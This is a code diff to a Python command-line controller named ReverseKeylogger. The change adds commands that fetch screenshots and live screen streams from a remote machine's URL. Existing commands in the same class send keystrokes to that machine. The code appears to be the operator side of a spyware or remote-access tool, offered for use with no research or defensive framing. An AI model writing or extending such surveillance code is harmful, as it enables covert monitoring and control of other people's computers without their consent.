@@ -34,6 +34,8 @@ class ReverseKeylogger(cmd.Cmd):
             print("  kr - Keyboard repeat")
             print("  ks - Keyboard shortcut")
             print("  kt - Keyboard type")
+            print("  ss - Take a screenshot")
+            print("  stream - Stream the screen")
             print("  clear - Clear the screen")
             print("  quit - Exit the program")
         elif arg == "ma":
@@ -63,6 +65,12 @@ class ReverseKeylogger(cmd.Cmd):
         elif arg == "kt":
             print("Keyboard type:")
             print("  <text> - Type the given text")
+        elif arg == "ss":
+            print("Take a screenshot:")
+            print("  ss - Take a screenshot, and open it")
+        elif arg == "stream":
+            print("Stream the screen:")
+            print("  stream <fps> - Stream the screen at the given fps")
         else:
             print("Invalid command")
 
@@ -106,6 +114,13 @@ class ReverseKeylogger(cmd.Cmd):
             requests.get(url + '/keyboard/type/' + arg)
         else:
             print("Invalid command")
+    def do_ss(self, arg):
+        os.startfile(url + "/screenshot")
+        print("Screenshot taken")
+        
+    def do_stream(self, arg):
+        os.startfile(url + f"/stream/{arg}")
+        print("Stream started")
 
     def do_clear(self, arg):
         os.system('cls' if os.name == 'nt' else 'clear')
